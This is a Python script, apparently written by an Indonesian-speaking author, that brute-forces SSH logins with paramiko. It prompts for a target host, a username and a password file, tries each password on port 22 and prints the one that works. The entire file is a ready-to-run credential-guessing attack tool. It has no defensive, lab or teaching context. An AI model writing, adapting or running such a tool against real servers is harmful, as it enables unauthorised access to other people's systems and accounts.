import paramiko, sys, os, socket, termcolor

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('File tidak di temukan !')
    sys.exit(1)
    
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('password di temukan : ' + password + ' ,Dari Account: ' + username),'green'))
                break
            elif response == 1:
                print('Gagal login: ' + password)
            elif response == 2:
                print('terdapat masalah ketika connection')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
